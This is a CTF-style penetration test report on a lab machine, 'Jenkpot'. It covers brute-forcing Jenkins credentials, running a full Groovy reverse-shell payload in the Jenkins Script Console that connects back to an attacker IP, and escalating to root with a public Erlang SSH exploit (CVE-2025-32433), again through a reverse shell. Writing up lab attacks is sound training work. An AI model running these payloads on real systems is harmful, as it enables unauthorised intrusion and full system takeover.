# Jenkpot - Penetration Test Report

**Machine:** Jenkpot

**Difficulty:** Easy

**IP Address:** 10.15.1.247

**Operating System:** Linux (Ubuntu)

**Date:** 19.02.2026

---

## Executive Summary

This report details the successful compromise of the Jenkpot machine, achieving root access through a combination of weak authentication, remote code execution via Jenkins, and exploitation of a critical SSH vulnerability (CVE-2025-32433). The attack chain demonstrates the dangers of default credentials and unpatched services.

---

## Enumeration

### Nmap

### Full Port Scan

```bash
sudo nmap -T4 -sV -sS -O -p- 10.15.1.247
```

![nmap.png](attachment:a8e819b5-15c7-450d-bed7-0b0ddb01ca2b:nmap.png)

---

| PORT | STATE | SERVICE |
| --- | --- | --- |
| 80/tcp | open | http |
| 8080/tcp | open | http |
| 22/tcp | open | ssh |

## Web Application Analysis

### Port 80 - Apache Web Server

The website presents a corporate landing page for "TechVision - Digital Agency" with contact forms and service information.

![Screenshot_2026-02-19_02-49-15.png](attachment:f4fd752d-64a1-4839-8763-b2911145506a:Screenshot_2026-02-19_02-49-15.png)

### Directory Enumeration

```bash
feroxbuster -u http://10.15.1.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -C 403,404
```

**Findings:** No significant directories or files discovered. The contact form was found to be entirely client-side JavaScript with no backend processing.

### Port 8080 - Jenkins 2.504.2

Jenkins automation server identified, running version 2.504.2 on Jetty 12.0.19.

![Screenshot_2026-02-19_02-53-35.png](attachment:5f81325e-6b5a-4565-af21-e4039f824bce:Screenshot_2026-02-19_02-53-35.png)

### Technology Stack

```bash
whatweb http://10.15.1.247:8080
```

**Results:**

- Jenkins 2.504.2
- Jetty 12.0.19
- HTTPOnly session cookies
- X-Jenkins headers present

![Screenshot_2026-02-19_02-56-18.png](attachment:d3862c3f-fbd4-4062-9aa7-03017531c280:Screenshot_2026-02-19_02-56-18.png)

---

## Initial Access

### Vulnerability: Weak Jenkins Credentials

**Severity:** Critical

**CVSSv3:** 9.8

### Exploitation

Attempted authentication brute force using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.1.247 -s 8080 \
http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:loginError" -t 10
```

### Tried default Credentials
- Username: **admin**
- Password: **jenkins**

![Screenshot_2026-02-19_02-59-50.png](attachment:5cfe7198-d67d-44d5-983f-53ff1e1c1a53:Screenshot_2026-02-19_02-59-50.png)

## Remote Code Execution via Groovy Script Console

With authenticated access to Jenkins, the Script Console was accessible at:

```bash
http://10.15.1.247:8080/script
```

![Screenshot_2026-02-19_04-04-47.png](attachment:492d581c-5710-4be2-8f32-122f42476c33:Screenshot_2026-02-19_04-04-47.png)

### Reverse Shell Payload

**Attacker Machine:**

```bash
nc -lvnp 4444
```

**Groovy Payload (Script Console):**

groovy

```bash
String host="10.8.0.163";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

![Screenshot_2026-02-19_02-07-21.png](attachment:02a229a6-fd87-4190-bc3b-b5a5a45205fb:f04d5535-f784-47c2-9211-dce6768e89eb.png)

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Access Obtained:**

- User: `jenkins`
- Shell: `/bin/bash`
- Working Directory: `/var/lib/jenkins`

![Screenshot_2026-02-19_04-10-26.png](attachment:88fa1105-dace-415b-8d6c-09594ac492ef:Screenshot_2026-02-19_04-10-26.png)

---

## Privilege Escalation

### Enumeration

### System Information

bash

```bash
uname -a
# Linux jenkpot 6.17.2-1-pve #1 SMP PREEMPT_DYNAMIC PMX 6.17.2-1 (2025-10-21T11:55Z) x86_64 x86_64 x86_64 GNU/Linux

id
# uid=999(jenkins) gid=999(jenkins) groups=999(jenkins)

ip a
# eth0@if833:10.15.1.247/23
ss -tlnp
127.0.0.1:2222
```

![Screenshot_2026-02-19_04-12-03.png](attachment:9e9ff030-b818-4b91-9ec4-51e9e1b7c387:Screenshot_2026-02-19_04-12-03.png)

Vulnerability: CVE-2025-32433 (Erlang OTP SSH RCE)

**Severity:** Critical

**CVSSv3:** 9.8

**Description:** Remote code execution in Erlang/OTP SSH daemon allowing unauthenticated attackers to execute arbitrary code.

## Exploitation

**PoC Discovery:**

cloned git hub repo https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC

![photo_2026-02-19_05-08-33.jpg](attachment:99a02f94-cbf4-49d7-a0ad-93b83123a6b6:photo_2026-02-19_05-08-33.jpg)

**Attacker Machine (Second Listener):**

```bash
nc -lvnp 1234
```

**Exploit Execution:**

```bash
cd /CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.8.0.163 --lport 1234
```

![Screenshot_2026-02-19_05-11-29.png](attachment:5c9e2e0b-7443-43d0-8e2b-d907e055b6ff:Screenshot_2026-02-19_05-11-29.png)

### Root Access Obtained

```bash
nc -lvnp 1234
# Connection from 10.15.1.247

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# jenkpot
```

![Screenshot_2026-02-19_05-12-38.png](attachment:6591d9f6-9d7f-47d0-a169-8226e2429c45:Screenshot_2026-02-19_05-12-38.png)

---

## Post-Exploitation

### Flags

```bash
cat /home/taylor.w/user.txt
# a766ec83a3400947aaa992166890452c

cat /root/root.txt
# 8fc6105c911834ba1c1322cf10745a2a
```

![Screenshot_2026-02-19_05-20-11.png](attachment:3ae7db17-9a5b-4690-ac1c-770a34be4aef:92a75c1a-8a55-4d95-8123-b6179d9844b2.png)

![Screenshot_2026-02-19_05-19-55.png](attachment:86116599-cc66-4af5-9c7f-14901e19b9fe:5f1faecf-eee4-4554-9884-f0c8acafd66c.png)

## Persistence

### Not established (out of scope for CTF environment).

`Findings Summary

|            Vulnerability         | Severity | CVSS|               Impact                   |
|----------------------------------|----------|-----|----------------------------------------|
| Weak Jenkins Credentials         | Critical | 9.8 |  Complete system compromise            |
| Jenkins Script Console RCE       | Critical | 9.0 |  Remote code execution as jenkins user |
| CVE-2025-32433 Erlang SSH RCE    | Critical | 9.8 |  Privilege escalation to root          |`

Attack Chain Visualization

1. Reconnaissance (Nmap) → Identified Jenkins on port 8080
                                               ↓
2. Brute Force Attack → Weak credentials discovered (admin:[PASS])
                                               ↓
3. Jenkins Access → Authenticated to Jenkins web interface
                                               ↓
4. RCE via Script Console → Groovy payload executed
                                               ↓
5. Reverse Shell → Shell as 'jenkins' user established
                                               ↓
6. Local Enumeration → Discovered Erlang SSH on port 2222
                                               ↓
7. CVE-2025-32433 Exploit → Exploited SSH vulnerability
                                               ↓
8. ROOT ACCESS → Complete system compromise
